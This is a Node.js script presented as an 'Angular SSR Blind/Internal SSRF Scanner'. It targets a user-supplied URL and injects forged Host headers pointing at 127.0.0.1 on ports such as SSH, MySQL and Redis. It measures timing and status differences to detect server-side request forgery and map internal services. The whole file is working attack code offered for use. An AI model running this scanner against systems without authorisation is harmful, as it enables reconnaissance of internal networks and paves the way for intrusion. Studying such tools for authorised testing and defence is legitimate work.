const { URL } = require('url');
const http = require('http');
const https = require('https');

const args = process.argv.slice(2);

if (args.length < 1) {
    console.log("============================================================");
    console.log("Angular SSR Blind/Internal SSRF Scanner");
    console.log("============================================================");
    console.log("Usage: node internal_scanner.js <TARGET_URL>");
    console.log("\nDescription:");
    console.log("  This script attempts to detect SSRF by forcing the target server");
    console.log("  to connect to its own internal ports (localhost).");
    console.log("  It looks for differences in response time and status codes.");
    console.log("\nExample:");
    console.log("  node internal_scanner.js https://example.com/dashboard");
    console.log("============================================================");
    process.exit(1);
}

const target = args[0];
const targetUrl = new URL(target);

// Ports to probe on the target's localhost
const PORTS_TO_TEST = [
    { port: 80, desc: 'HTTP (Standard)' },
    { port: 22, desc: 'SSH (Service)' },
    { port: 3306, desc: 'MySQL (Database)' },
    { port: 6379, desc: 'Redis (Cache)' },
    { port: 54321, desc: 'Random High Port (Likely Closed)' }
];

console.log(`\n[+] Target: ${target}`);
console.log(`[+] Method: Internal Port Scanning (Blind SSRF)`);
console.log(`[+] Logic:  Injecting 'Host: 127.0.0.1:<PORT>' and measuring response.`);

async function sendRequest(hostHeader, description) {
    return new Promise((resolve) => {
        const isHttps = targetUrl.protocol === 'https:';
        const lib = isHttps ? https : http;
        
        const options = {
            hostname: targetUrl.hostname,
            port: targetUrl.port || (isHttps ? 443 : 80),
            path: targetUrl.pathname + targetUrl.search,
            method: 'GET',
            headers: {
                'Host': hostHeader,
                'User-Agent': 'Mozilla/5.0 (Security-Test)',
                'Cache-Control': 'no-cache'
            },
            rejectUnauthorized: false,
            timeout: 10000 // 10s timeout
        };

        const start = process.hrtime();

        const req = lib.request(options, (res) => {
            let bodyLength = 0;
            res.on('data', (chunk) => bodyLength += chunk.length);
            res.on('end', () => {
                const diff = process.hrtime(start);
                const timeMs = (diff[0] * 1000 + diff[1] / 1e6).toFixed(2);
                resolve({
                    host: hostHeader,
                    desc: description,
                    status: res.statusCode,
                    size: bodyLength,
                    time: parseFloat(timeMs),
                    error: null
                });
            });
        });

        req.on('error', (e) => {
            const diff = process.hrtime(start);
            const timeMs = (diff[0] * 1000 + diff[1] / 1e6).toFixed(2);
            resolve({
                host: hostHeader,
                desc: description,
                status: 'ERR',
                size: 0,
                time: parseFloat(timeMs),
                error: e.message
            });
        });

        req.on('timeout', () => {
            req.destroy();
            resolve({
                host: hostHeader,
                desc: description,
                status: 'TIMEOUT',
                size: 0,
                time: 10000,
                error: 'Request Timed Out'
            });
        });

        req.end();
    });
}

async function run() {
    console.log(`\n--------------------------------------------------------------------------------`);
    console.log(`| ${'Host Header'.padEnd(25)} | ${'Desc'.padEnd(15)} | ${'Status'.padEnd(6)} | ${'Size'.padEnd(8)} | ${'Time (ms)'.padEnd(10)} |`);
    console.log(`--------------------------------------------------------------------------------`);

    // 1. Baseline Request (Real Host)
    const baseline = await sendRequest(targetUrl.host, 'Baseline');
    console.log(`| ${baseline.host.padEnd(25)} | ${baseline.desc.padEnd(15)} | ${String(baseline.status).padEnd(6)} | ${String(baseline.size).padEnd(8)} | ${String(baseline.time).padEnd(10)} |`);

    // 2. Probe Internal Ports
    for (const p of PORTS_TO_TEST) {
        const host = `127.0.0.1:${p.port}`;
        const result = await sendRequest(host, p.desc);
        console.log(`| ${result.host.padEnd(25)} | ${result.desc.padEnd(15)} | ${String(result.status).padEnd(6)} | ${String(result.size).padEnd(8)} | ${String(result.time).padEnd(10)} |`);
    }
    console.log(`--------------------------------------------------------------------------------`);

    console.log(`\n[?] Interpretation:`);
    console.log(`    1. Look for SIGNIFICANT differences in 'Time' or 'Status' compared to the Baseline.`);
    console.log(`    2. If 'Random High Port' is fast (Connection Refused) and 'HTTP' is slow (Timeout/Connect),`);
    console.log(`       it means the server is trying to connect to those ports.`);
    console.log(`    3. If all requests look exactly the same as Baseline, the page might not be vulnerable`);
    console.log(`       or it's not making relative requests.`);
}

run();
